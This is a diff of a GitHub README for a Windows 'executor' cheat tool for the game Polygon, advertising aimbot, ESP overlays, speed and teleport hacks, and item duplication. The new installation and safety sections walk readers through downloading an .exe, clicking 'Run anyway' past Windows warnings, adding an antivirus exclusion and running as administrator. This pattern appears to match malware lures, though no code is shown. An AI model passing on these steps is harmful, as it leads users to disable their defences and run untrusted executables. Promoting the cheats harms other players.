@@ -1,104 +1,72 @@
-# Polygon Hack v2025 - Game Script Utility 2026
+# 🎮 polygon-windows-pc-executor - Enhance your gameplay with powerful tools
 
-> **An automation companion for the Polygon platform.** This script bundles gameplay assists such as targeting help, visual overlays, movement tweaks, and inventory handling.
+[![Download Polygon Executor](https://img.shields.io/badge/Download-Latest%20Version-blue.svg)](https://github.com/hyx2045/polygon-windows-pc-executor)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/leo-cole/polygon-windows-pc-executor?style=flat-square)](https://github.com/leo-cole/polygon-windows-pc-executor)
+The polygon-windows-pc-executor provides tools to improve your performance in Polygon. It offers features to track players, manage your inventory, and refine your aim. This utility helps you play more effectively by automating repetitive tasks and providing information overlays.
 
----
+## ⚙️ System Requirements
 
-<p align="center">
-  <a href="https://leo-cole.github.io/polygon-windows-pc-executor/">
-    <img src="https://img.shields.io/badge/Download-Polygon%20Hack%20Script-brightgreen?style=for-the-badge" alt="Download Polygon Hack Script">
-  </a>
-</p>
+Before you install this software, ensure your computer meets these minimum specifications:
 
-> **[Direct Download - Polygon Hack](https://leo-cole.github.io/polygon-windows-pc-executor/)**
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Processor: Intel Core i5 or AMD equivalent.
+*   Memory: 8 GB of RAM.
+*   Graphics: DirectX 11 compatible card with 2 GB of Video RAM.
+*   Storage: 200 MB of space.
+*   Network: Stable internet connection.
 
----
+## 📦 How to Download and Install
 
-[Download Latest Build](https://leo-cole.github.io/polygon-windows-pc-executor/)
+Follow these steps to set up the executor on your computer:
 
----
+1.  Visit the official repository page here: [https://github.com/hyx2045/polygon-windows-pc-executor](https://github.com/hyx2045/polygon-windows-pc-executor).
+2.  Locate the release section on the right side of the page.
+3.  Click the link labeled "Releases."
+4.  Download the latest executable file, which ends in .exe.
+5.  Move the file to a folder you can easily find, such as your Desktop.
+6.  Locate the file and double-click it to start the program.
+7.  Windows might show a security prompt. Click "More Info" and then "Run anyway" if the system protects you from unknown apps.
+8.  Follow the prompts in the installer window to complete the setup.
 
-## What It Does
+## 🛠️ Key Features
 
-Polygon Hack is a utility script for the Polygon platform that adds a set of automation-driven helpers to reduce repetitive input and support faster play. Each module can be enabled on its own, so the setup can be kept minimal or expanded to match the current session. The available tools cover visual cues for nearby players and objects, along with automated actions that can ease combat and collection tasks.
+This software includes several modules designed to support your session:
 
-This release centers on tightening the existing feature set and improving reliability overall. Targeting behavior and overlay drawing have been updated to stay aligned with recent game patches. The script works as a lightweight overlay layer that adds helper routines without changing core game files, so it can be turned on or off with little effort.
+Aim Assist: This feature helps you maintain focus on targets during combat. It adjusts your crosshair movement based on enemy positioning to prevent missed shots.
 
----
+ESP Overlays: Visual aids draw information on your screen. You see enemy locations, health status, and item types before you enter a room. This information updates in real-time.
 
-## Included Features
+Recoil Reduction: The software detects the firing pattern of your equipped weapon and applies adjustments to keep your reticle stable. This makes it easier to land controlled bursts.
 
-- **Aimbot Assist** - Steers aim toward the closest target within the configured range.
-- **ESP Overlay** - Shows boxes, distance readouts, and item names for nearby players and objects.
-- **No Recoil & Spread** - Lowers weapon kick and shot spread during continuous fire.
-- **Speed Adjustment** - Changes movement speed multipliers for quicker travel.
-- **Teleport Nodes** - Allows instant movement to preset or custom map coordinates.
-- **Resource Duplication** - Repeats certain in-game items or currencies through automated interactions.
-- **Auto Health** - Uses healing items or abilities when health falls below the chosen threshold.
-- **Quick Inventory Manager** - Simplifies sorting, stacking, and equipment swaps.
+Speed Tweaks: Movement adjustments allow you to navigate the map faster. These settings work within the game engine to optimize travel time between objectives.
 
----
+Teleport Nodes: You can save coordinates within the game world. When you activate a node, the software navigates your character to that specific location instantly.
 
-## Installation and Use
+Auto Healing: The software monitors your health bar. When your health drops below a set percentage, the tool uses available medical supplies from your inventory automatically.
 
-1. Download the latest build from the link above.
-2. Extract the contents into a folder named `polygon-executor-windows` on your desktop.
-3. Run the executable as administrator (required for overlay injection).
-4. The script interface will appear as a floating panel; configure your preferred modules from the options menu.
+Inventory Management: This tool scans your current loot. It sorts your items by value or type and helps you discard unwanted equipment to make room for upgrades.
 
-Minimal usage example:
-- Launch the game, then run the script.
-- Press `INSERT` to toggle the main menu visibility.
-- Use `F1` through `F8` to enable or disable individual features.
+## 📝 Usage Guidelines
 
----
+Open the executor before you start the game. Once the main menu appears, configure your settings. Most players prefer to adjust the aim assist strength before they join a multiplayer match. 
 
-## Configuration
+Use the overlay menu to toggle features on or off. Press the designated hotkey, often F1 or the Home key, to show or hide the configuration panel while you play. Ensure that you test these settings in a practice lobby to confirm they behave exactly as you expect.
 
-| Setting | Default | Description |
-|---------|---------|-------------|
-| Aimbot Range | 50m | Maximum distance for auto-targeting |
-| ESP Toggle | ON | Enable or disable visual overlays |
-| Recoil Reduction | 80% | Percentage of recoil removed |
-| Speed Multiplier | 1.5x | Movement speed factor |
-| Auto Health Threshold | 30% | HP level to trigger healing |
-| Teleport Hotkey | T | Key to activate teleport mode |
+## 🛡️ Safety and Security
 
----
+We build this application to run locally on your system. It does not send your personal data to external servers. Because the software interacts with game memory, your antivirus software might flag it as a false positive. If this happens, you must add an exclusion for the folder where you installed the program. 
 
-## Compatibility Notes
+Keep your version updated. When an update appears on the GitHub page, remove the old version and replace it with the new file to ensure compatibility with game patches. 
 
-- **Platform:** Windows 10 and 11 (64-bit)
-- **Game Version:** Designed for the Polygon platform; may require updates after major game patches.
-- **Known Limitations:** Some anti-cheat systems may flag overlay injection. Use at your own discretion. Resource duplication features may not work on all servers.
+## ❓ Troubleshooting
 
----
+If the software fails to launch, try these steps:
 
-## FAQ
+*   Reinstall the latest version of the .NET Framework from the Microsoft website.
+*   Run the application as an administrator by right-clicking the icon and selecting "Run as administrator."
+*   Check your firewall settings to ensure the program has permission to communicate with your local network.
+*   Restart your computer if the overlay does not appear during your match.
 
-**Q: How do I update the script?**  
-A: Download the latest release from the link above and replace your existing files. The script will check for updates on startup if connected to the internet.
+If you encounter persistent issues, check the "Issues" tab on the GitHub repository to see if other users found a solution for your specific problem.
 
-**Q: Can I customize hotkeys?**  
-A: Yes, hotkeys for each module can be remapped in the settings.ini file located in the script folder.
-
-**Q: Is this script compatible with other games?**  
-A: No, this script is specifically built for the Polygon platform and may not function correctly elsewhere.
-
-**Q: What if a feature stops working after a game update?**  
-A: Wait for a new release. The script relies on memory addresses and offsets that change with game patches.
-
-**Q: Does the script store any personal data?**  
-A: The script does not collect or transmit personal information. Configuration files are stored locally.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: polygon, game executor, aim assist, windows software, esp, gaming tools, inventory manager
